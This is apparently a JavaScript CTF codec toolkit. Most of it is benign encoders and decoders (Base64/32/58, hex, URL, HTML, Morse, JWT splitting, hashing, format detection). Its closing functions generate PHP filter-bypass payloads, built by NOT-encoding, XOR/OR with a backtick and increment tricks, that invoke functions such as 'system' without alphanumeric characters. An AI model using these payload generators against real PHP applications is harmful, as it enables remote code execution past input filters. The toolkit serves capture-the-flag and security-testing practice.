(function (root) {
  "use strict";

  var BASE32_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  var BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  var MORSE_TABLE = {
    A: ".-", B: "-...", C: "-.-.", D: "-..", E: ".", F: "..-.", G: "--.",
    H: "....", I: "..", J: ".---", K: "-.-", L: ".-..", M: "--", N: "-.",
    O: "---", P: ".--.", Q: "--.-", R: ".-.", S: "...", T: "-", U: "..-",
    V: "...-", W: ".--", X: "-..-", Y: "-.--", Z: "--..",
    "0": "-----", "1": ".----", "2": "..---", "3": "...--", "4": "....-",
    "5": ".....", "6": "-....", "7": "--...", "8": "---..", "9": "----.",
    ".": ".-.-.-", ",": "--..--", "?": "..--..", "'": ".----.", "!": "-.-.--",
    "/": "-..-.", "(": "-.--.", ")": "-.--.-", "&": ".-...", ":": "---...",
    ";": "-.-.-.", "=": "-...-", "+": ".-.-.", "-": "-....-", "_": "..--.-",
    '"': ".-..-.", $: "...-..-", "@": ".--.-.", " ": "/"
  };
  var MORSE_REV = {};
  Object.keys(MORSE_TABLE).forEach(function (k) {
    MORSE_REV[MORSE_TABLE[k]] = k;
  });

  function textToBytes(text) {
    return new TextEncoder().encode(String(text == null ? "" : text));
  }

  function bytesToText(bytes) {
    try {
      return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
    } catch (e) {
      return Array.prototype.map.call(bytes, function (b) {
        return String.fromCharCode(b);
      }).join("");
    }
  }

  function bytesToHex(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++) out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
  }

  function hexToBytes(hex) {
    var s = String(hex).replace(/\s+/g, "").replace(/^0x/i, "");
    if (s.length % 2) s = "0" + s;
    if (!/^[0-9a-fA-F]*$/.test(s)) throw new Error("不是合法 Hex");
    var arr = new Uint8Array(s.length / 2);
    for (var i = 0; i < arr.length; i++) arr[i] = parseInt(s.substr(i * 2, 2), 16);
    return arr;
  }

  function bytesToBase64(bytes) {
    var bin = "";
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
  }

  function base64ToBytes(str) {
    var s = String(str).replace(/\s+/g, "").replace(/-/g, "+").replace(/_/g, "/");
    var pad = s.length % 4;
    if (pad) s += "====".slice(pad);
    var bin = atob(s);
    var arr = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
    return arr;
  }

  function toBase64Url(b64) {
    return b64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
  }

  function bytesToBase32(bytes) {
    var bits = "";
    for (var i = 0; i < bytes.length; i++) bits += ("00000000" + bytes[i].toString(2)).slice(-8);
    var out = "";
    for (var j = 0; j < bits.length; j += 5) {
      var chunk = bits.substr(j, 5);
      if (chunk.length < 5) chunk += "00000".slice(chunk.length);
      out += BASE32_ALPHABET[parseInt(chunk, 2)];
    }
    while (out.length % 8) out += "=";
    return out;
  }

  function base32ToBytes(str) {
    var s = String(str).toUpperCase().replace(/\s+/g, "").replace(/=+$/g, "");
    var bits = "";
    for (var i = 0; i < s.length; i++) {
      var idx = BASE32_ALPHABET.indexOf(s[i]);
      if (idx < 0) throw new Error("不是合法 Base32");
      bits += ("00000" + idx.toString(2)).slice(-5);
    }
    var arr = [];
    for (var j = 0; j + 8 <= bits.length; j += 8) arr.push(parseInt(bits.substr(j, 8), 2));
    return new Uint8Array(arr);
  }

  function bytesToBase58(bytes) {
    var digits = [0];
    for (var i = 0; i < bytes.length; i++) {
      var carry = bytes[i];
      for (var j = 0; j < digits.length; j++) {
        carry += digits[j] << 8;
        digits[j] = carry % 58;
        carry = (carry / 58) | 0;
      }
      while (carry) {
        digits.push(carry % 58);
        carry = (carry / 58) | 0;
      }
    }
    var zeros = 0;
    while (zeros < bytes.length && bytes[zeros] === 0) zeros++;
    var out = "";
    for (var z = 0; z < zeros; z++) out += "1";
    for (var k = digits.length - 1; k >= 0; k--) out += BASE58_ALPHABET[digits[k]];
    return out;
  }

  function base58ToBytes(str) {
    var s = String(str).replace(/\s+/g, "");
    var bytes = [0];
    for (var i = 0; i < s.length; i++) {
      var idx = BASE58_ALPHABET.indexOf(s[i]);
      if (idx < 0) throw new Error("不是合法 Base58");
      var carry = idx;
      for (var j = 0; j < bytes.length; j++) {
        carry += bytes[j] * 58;
        bytes[j] = carry & 0xff;
        carry >>= 8;
      }
      while (carry) {
        bytes.push(carry & 0xff);
        carry >>= 8;
      }
    }
    var zeros = 0;
    while (zeros < s.length && s[zeros] === "1") zeros++;
    bytes.reverse();
    var out = new Uint8Array(zeros + bytes.length);
    for (var k = 0; k < bytes.length; k++) out[zeros + k] = bytes[k];
    return out;
  }

  function htmlEncode(text) {
    return String(text)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  }

  function htmlDecode(text) {
    var named = { amp: "&", lt: "<", gt: ">", quot: '"', apos: "'", nbsp: " " };
    return String(text)
      .replace(/&(#x[0-9a-fA-F]+|#\d+|[a-zA-Z]+);/g, function (_, ent) {
        if (ent[0] === "#") {
          var code = ent[1].toLowerCase() === "x" ? parseInt(ent.slice(2), 16) : parseInt(ent.slice(1), 10);
          return String.fromCodePoint(code);
        }
        return named[ent.toLowerCase()] || "&" + ent + ";";
      });
  }

  function unicodeEncode(text, style) {
    var s = String(text);
    var out = "";
    for (var i = 0; i < s.length; i++) {
      var cp = s.codePointAt(i);
      if (cp > 0xffff) {
        i++;
        out += "\\u{" + cp.toString(16) + "}";
        continue;
      }
      var hex = ("0000" + cp.toString(16)).slice(-4);
      if (style === "html") out += "&#x" + hex + ";";
      else if (style === "percent") out += "%u" + hex.toUpperCase();
      else out += "\\u" + hex;
    }
    return out;
  }

  function unicodeDecode(text) {
    return String(text)
      .replace(/\\u\{([0-9a-fA-F]+)\}/g, function (_, h) { return String.fromCodePoint(parseInt(h, 16)); })
      .replace(/\\u([0-9a-fA-F]{4})/g, function (_, h) { return String.fromCharCode(parseInt(h, 16)); })
      .replace(/\\x([0-9a-fA-F]{2})/g, function (_, h) { return String.fromCharCode(parseInt(h, 16)); })
      .replace(/%u([0-9a-fA-F]{4})/g, function (_, h) { return String.fromCharCode(parseInt(h, 16)); })
      .replace(/&#x([0-9a-fA-F]+);/g, function (_, h) { return String.fromCodePoint(parseInt(h, 16)); })
      .replace(/&#(\d+);/g, function (_, n) { return String.fromCodePoint(parseInt(n, 10)); });
  }

  function rotN(text, n) {
    n = ((n % 26) + 26) % 26;
    return String(text).replace(/[A-Za-z]/g, function (ch) {
      var base = ch <= "Z" ? 65 : 97;
      return String.fromCharCode(((ch.charCodeAt(0) - base + n) % 26) + base);
    });
  }

  function morseEncode(text) {
    return String(text).toUpperCase().split("").map(function (ch) {
      return MORSE_TABLE[ch] || ch;
    }).join(" ").replace(/\s+\/\s+/g, " / ");
  }

  function morseDecode(text) {
    return String(text).trim().split(/\s+/).map(function (tok) {
      if (tok === "/" || tok === "|") return " ";
      return MORSE_REV[tok] || tok;
    }).join("").replace(/ +/g, " ");
  }

  function binaryEncode(text) {
    return Array.prototype.map.call(textToBytes(text), function (b) {
      return ("00000000" + b.toString(2)).slice(-8);
    }).join(" ");
  }

  function binaryDecode(text) {
    var bits = String(text).replace(/[^01]/g, "");
    if (bits.length % 8) throw new Error("二进制长度不是 8 的倍数");
    var arr = new Uint8Array(bits.length / 8);
    for (var i = 0; i < arr.length; i++) arr[i] = parseInt(bits.substr(i * 8, 8), 2);
    return bytesToText(arr);
  }

  function quotedPrintableEncode(text) {
    var bytes = textToBytes(text);
    var out = "";
    for (var i = 0; i < bytes.length; i++) {
      var b = bytes[i];
      if ((b >= 33 && b <= 60) || (b >= 62 && b <= 126)) out += String.fromCharCode(b);
      else out += "=" + ("0" + b.toString(16).toUpperCase()).slice(-2);
    }
    return out;
  }

  function quotedPrintableDecode(text) {
    var s = String(text).replace(/=\r?\n/g, "");
    var arr = [];
    for (var i = 0; i < s.length; i++) {
      if (s[i] === "=" && /^[0-9A-Fa-f]{2}/.test(s.substr(i + 1, 2))) {
        arr.push(parseInt(s.substr(i + 1, 2), 16));
        i += 2;
      } else arr.push(s.charCodeAt(i));
    }
    return bytesToText(new Uint8Array(arr));
  }

  function jwtSplit(token) {
    var parts = String(token).trim().split(".");
    if (parts.length < 2) throw new Error("不是 JWT 结构（需要 header.payload.signature）");
    function decodePart(p) {
      var json = bytesToText(base64ToBytes(p));
      try { return { raw: json, json: JSON.parse(json) }; }
      catch (e) { return { raw: json, json: null }; }
    }
    return {
      header: decodePart(parts[0]),
      payload: decodePart(parts[1]),
      signature: parts.slice(2).join(".") || "",
      parts: parts
    };
  }

  function detect(text) {
    var s = String(text || "").trim();
    var hits = [];
    if (!s) return hits;
    if (/^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test(s)) hits.push({ id: "jwt", label: "JWT" });
    if (/^[A-Za-z0-9+/_-]{12,}={0,2}$/.test(s) && s.length % 4 !== 1) hits.push({ id: "base64", label: "Base64 / Base64URL" });
    if (/^(?:[A-Z2-7]{8})+(?:[A-Z2-7]{2}={6}|[A-Z2-7]{4}={4}|[A-Z2-7]{5}={3}|[A-Z2-7]{7}=)?$/i.test(s)) hits.push({ id: "base32", label: "Base32" });
    if (/^(?:0x)?[0-9a-fA-F]{8,}$/.test(s.replace(/\s+/g, "")) && s.replace(/\s+/g, "").replace(/^0x/i, "").length % 2 === 0) hits.push({ id: "hex", label: "Hex" });
    if (/%[0-9A-Fa-f]{2}/.test(s)) hits.push({ id: "url", label: "URL 编码" });
    if (/\\u[0-9A-Fa-f]{4}|\\x[0-9A-Fa-f]{2}|%u[0-9A-Fa-f]{4}/.test(s)) hits.push({ id: "unicode", label: "Unicode 转义" });
    if (/&(#\d+|#x[0-9a-fA-F]+|[a-zA-Z]+);/.test(s)) hits.push({ id: "html", label: "HTML 实体" });
    if (/^[.\- /|]+$/.test(s) && /[.-]/.test(s)) hits.push({ id: "morse", label: "Morse" });
    if (/^[01\s]+$/.test(s) && s.replace(/\s+/g, "").length >= 8) hits.push({ id: "binary", label: "二进制" });
    if (/^[0-9a-fA-F]{32}$/.test(s)) hits.push({ id: "md5", label: "可能是 MD5" });
    if (/^[0-9a-fA-F]{40}$/.test(s)) hits.push({ id: "sha1", label: "可能是 SHA1" });
    if (/^[0-9a-fA-F]{64}$/.test(s)) hits.push({ id: "sha256", label: "可能是 SHA256" });
    return hits;
  }

  function run(op, input, extra) {
    extra = extra || {};
    var text = String(input == null ? "" : input);
    switch (op) {
      case "base64_encode": return bytesToBase64(textToBytes(text));
      case "base64_decode": return bytesToText(base64ToBytes(text));
      case "base64url_encode": return toBase64Url(bytesToBase64(textToBytes(text)));
      case "base64url_decode": return bytesToText(base64ToBytes(text));
      case "hex_encode": return bytesToHex(textToBytes(text));
      case "hex_decode": return bytesToText(hexToBytes(text));
      case "url_encode": return encodeURIComponent(text);
      case "url_decode": return decodeURIComponent(text.replace(/\+/g, "%20"));
      case "html_encode": return htmlEncode(text);
      case "html_decode": return htmlDecode(text);
      case "unicode_encode": return unicodeEncode(text, extra.style);
      case "unicode_decode": return unicodeDecode(text);
      case "base32_encode": return bytesToBase32(textToBytes(text));
      case "base32_decode": return bytesToText(base32ToBytes(text));
      case "base58_encode": return bytesToBase58(textToBytes(text));
      case "base58_decode": return bytesToText(base58ToBytes(text));
      case "rot13": return rotN(text, 13);
      case "caesar": return rotN(text, Number(extra.shift || 0));
      case "morse_encode": return morseEncode(text);
      case "morse_decode": return morseDecode(text);
      case "binary_encode": return binaryEncode(text);
      case "binary_decode": return binaryDecode(text);
      case "qp_encode": return quotedPrintableEncode(text);
      case "qp_decode": return quotedPrintableDecode(text);
      default: throw new Error("未知操作: " + op);
    }
  }

  async function digest(algorithm, text) {
    var name = String(algorithm).toUpperCase();
    if (root.ctfToolbox && typeof root.ctfToolbox.hash === "function") {
      var mapped = name === "SHA-1" ? "sha1" : name.replace("-", "").toLowerCase();
      try { return root.ctfToolbox.hash(mapped, text); } catch (e) { /* fallback */ }
    }
    if (root.crypto && root.crypto.subtle) {
      var buf = await root.crypto.subtle.digest(name, textToBytes(text));
      return bytesToHex(new Uint8Array(buf));
    }
    throw new Error("当前环境无法计算 " + name);
  }

  function phpNotEncode(text) {
    var bytes = textToBytes(text);
    var out = "";
    for (var i = 0; i < bytes.length; i++) {
      var n = (~bytes[i]) & 0xff;
      out += "%" + ("0" + n.toString(16)).slice(-2);
    }
    return out;
  }

  function phpXorBacktick(text) {
    var s = String(text || "");
    var parts = [];
    for (var i = 0; i < s.length; i++) {
      var x = s.charCodeAt(i) ^ 0x60;
      parts.push("('%" + ("0" + x.toString(16)).slice(-2) + "'^'`')");
    }
    return parts.join(".");
  }

  function phpOrBacktick(text) {
    var s = String(text || "");
    var left = "";
    var right = "";
    for (var i = 0; i < s.length; i++) {
      var code = s.charCodeAt(i);
      var low = code & 0x1f;
      left += "%" + ("0" + low.toString(16)).slice(-2);
      right += "%60";
    }
    return "(\"" + left + "\"|\"" + right + "\")";
  }

  function phpIncrementBuild(word) {
    var target = String(word || "").toUpperCase();
    if (!/^[A-Z]+$/.test(target)) throw new Error("自增构造目前只支持纯字母，例如 assert / system");
    var lines = [
      "$_=[].'';",
      "$___=$_[$__];",
      "$_=$___;"
    ];
    var acc = "$fun";
    lines.push(acc + "='';");
    for (var i = 0; i < target.length; i++) {
      var dist = target.charCodeAt(i) - 65;
      lines.push("$__=$_;" + new Array(dist + 1).join("$__++;") + acc + ".=$__;");
    }
    lines.push(acc + "();");
    return lines.join("");
  }

  function phpBypassBundle(fn, arg) {
    fn = String(fn || "phpinfo");
    arg = arg == null ? "" : String(arg);
    var notFn = phpNotEncode(fn);
    var bundle = {
      notCall: "(~" + notFn + ")();",
      notFn: notFn,
      xorFn: "$_=" + phpXorBacktick(fn) + ";$_();",
      orFn: phpOrBacktick(fn) + "();",
      increment: phpIncrementBuild(fn)
    };
    if (arg) {
      bundle.notCall = "(~" + notFn + ")(~" + phpNotEncode(arg) + ");";
      bundle.xorFn = "$_=" + phpXorBacktick(fn) + ";$_(" + phpXorBacktick(arg) + ");";
      bundle.orFn = phpOrBacktick(fn) + "(" + phpOrBacktick(arg) + ");";
    }
    return bundle;
  }

  root.CtfCodec = {
    run: run,
    detect: detect,
    jwtSplit: jwtSplit,
    digest: digest,
    rotN: rotN,
    bytesToHex: bytesToHex,
    textToBytes: textToBytes,
    phpNotEncode: phpNotEncode,
    phpXorBacktick: phpXorBacktick,
    phpOrBacktick: phpOrBacktick,
    phpIncrementBuild: phpIncrementBuild,
    phpBypassBundle: phpBypassBundle
  };
})(window);
